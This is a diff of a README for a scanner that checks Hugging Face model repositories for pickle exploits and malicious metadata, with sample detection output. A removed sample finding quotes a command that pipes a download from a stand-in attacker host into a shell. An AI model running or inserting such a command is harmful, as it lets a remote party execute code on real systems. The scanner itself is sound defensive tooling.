@@ -8,7 +8,7 @@ Scans Hugging Face model repositories for pickle exploits, supply-chain signals,
 
 ## Status
 
-Alpha. This scanner is functional and passes its test suite (262 tests), but has not been deployed at scale or audited by third parties. Use it as one signal among many in your model security workflow, not as a sole gatekeeper.
+Alpha. This scanner is functional and passes 262 tests (7 skipped due to optional dependencies not installed: 4 require `attack-v19-core` for MITRE ATT&CK mapping, 3 require Linux for sandbox execution). It has scanned the top 100 most-downloaded HuggingFace models successfully. Use it as one signal among many in your model security workflow, not as a sole gatekeeper.
 
 ## Architecture
 
@@ -106,36 +106,43 @@ hf-scanner bert-base-uncased --fail-on critical
 
 Clean scan:
 ```
-Scanning: bert-base-uncased
-Files analyzed: 6
-Bytes fetched: 487 KB (model size: 440 MB)
-Time: 89 ms
+Risk: LOW (0/100)
 
-✓ No findings. All files pass provenance checks.
+
+8 findings (0 critical, 0 high, 0 medium)
 ```
 
-Malicious model detected:
+Malicious model detected (local scan on fixtures):
+```
+Risk: CRITICAL (100/100)
+  - 6 critical findings
+  - 3 high findings
+  - 4 medium findings
+  - High-signal active threat indicators detected
+
+[CRITICAL] HFS-050 malicious_os_system.pkl:0 - Pickle file contains opcode invoking
+  dangerous callable (os.system, subprocess, exec, eval, etc.)
+[CRITICAL] HFS-001 privacy_filter_loader.py:0 - powershell-subprocess (decoded layer 0)
+[HIGH] HFS-056 malicious_metadata.gguf:0 - GGUF metadata key-value contains suspicious
+  content (URLs, scripts, shell commands)
+```
+
+SARIF output (`--format sarif`):
 ```json
 {
-  "ruleId": "PICKLE-001",
+  "ruleId": "HFS-001",
   "level": "error",
   "message": {
-    "text": "Pickle gadget chain detected: builtins.exec called via REDUCE opcode at offset 0x1a4. Call resolves to os.system('curl attacker.com/exfil | sh')."
+    "text": "powershell-subprocess (decoded layer 0)"
   },
   "locations": [{
     "physicalLocation": {
-      "artifactLocation": {"uri": "model.pkl"},
-      "region": {"byteOffset": 420, "byteLength": 64}
+      "artifactLocation": {"uri": "malicious/privacy_filter_loader.py"},
+      "region": {"startLine": 1, "startColumn": 1}
     }
   }],
   "properties": {
-    "protocol_version": 4,
-    "opcode": "REDUCE",
-    "sink": "builtins.exec",
-    "resolved_call": "os.system",
-    "obfuscation_layers": ["base64.b64decode", "chr() concat"],
-    "cve": "CVE-2024-5480",
-    "mitre_attack": "T1059.006"
+    "evidence": "[decoded] matches powershell"
   }
 }
 ```
@@ -183,9 +190,9 @@ Uses HTTP Range requests to fetch only file headers (typically <1MB) instead of 
 | Standard | Integration |
 |----------|------------|
 | SARIF 2.1 | Full findings output with physical locations |
-| CycloneDX 1.5 | Software Bill of Materials generation |
-| MITRE ATT&CK v19 | Technique ID mapping per finding |
-| CVE database | Cross-reference with known pickle CVEs |
+| CycloneDX 1.5 | Software Bill of Materials generation (`--aibom`) |
+| MITRE ATT&CK v19 | Technique ID mapping (requires `pip install -e ".[attack]"`) |
+| CVE database | Cross-reference with known pickle CVEs (CVE-2024-5480, CVE-2024-25664) |
 
 ## Contributing
 
